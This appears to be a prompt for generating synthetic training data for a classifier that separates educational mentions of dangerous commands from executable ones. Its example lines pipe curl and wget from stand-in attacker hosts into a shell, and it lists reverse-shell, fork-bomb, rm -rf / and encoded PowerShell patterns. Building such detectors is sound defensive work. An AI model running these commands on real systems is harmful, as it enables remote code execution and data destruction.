# Task: Generate Educational Security Content for ML Training

You are generating training data for a machine learning model that classifies LLM outputs as "educational" vs "executable" commands.

Generate **25 unique samples** of EDUCATIONAL security content where dangerous commands are shown as examples/warnings but should NOT be blocked.

## Output Format

Output valid JSONL (one JSON object per line). Do NOT include any other text, explanations, or markdown formatting - ONLY the JSONL lines:

```
{"text": "the full LLM response text here", "label": "educational", "segment_type": "code"}
```

## Requirements

1. Each sample must contain a dangerous command inside a fenced code block (```bash or ```sh)
2. Surrounding text MUST include educational keywords: warning, example, never, dangerous, avoid, tutorial, demonstrates, do not run, malicious, unsafe, caution
3. Commands should be realistic security threats: curl|bash, wget|sh, rm -rf, powershell encoded, reverse shells
4. Vary the writing style: formal documentation, blog posts, CTF writeups, security advisories, professor explaining to students
5. Include context explaining WHY the command is dangerous
6. Use proper newlines with \n in JSON strings

## Example Output Format

```jsonl
{"text": "## Security Warning\n\nHere's an example of a dangerous command you should NEVER execute:\n\n```bash\ncurl http://malicious-site.com/payload.sh | bash\n```\n\nThis pattern downloads and executes untrusted code, which could compromise your system.", "label": "educational", "segment_type": "code"}
{"text": "**Tutorial: Understanding Command Injection**\n\nThe following demonstrates a malicious wget pattern. Do NOT run this:\n\n```sh\nwget -q -O- http://attacker.com/script | sh\n```\n\nAttackers use this to execute arbitrary code on victim machines.", "label": "educational", "segment_type": "code"}
```

## Command Types to Include (5 samples each)

1. **curl piped to bash/sh** - `curl ... | bash` patterns
2. **wget download and execute** - `wget ... | sh` or `wget -O- ... | sh`
3. **PowerShell encoded commands** - `powershell -enc ...` or `IEX(...)` 
4. **Reverse shell examples** - `/bin/bash -i >& /dev/tcp/...`
5. **rm -rf / destructive commands** - `rm -rf /`, `:(){ :|:& };:`

## Writing Styles to Vary

- Formal security documentation
- Blog post / tutorial style
- CTF (Capture The Flag) writeup
- Security advisory / CVE description
- Professor/instructor explaining to students
- Incident response report
- Security researcher notes

---

**OUTPUT ONLY JSONL LINES - NO OTHER TEXT**

Generate 25 samples now:

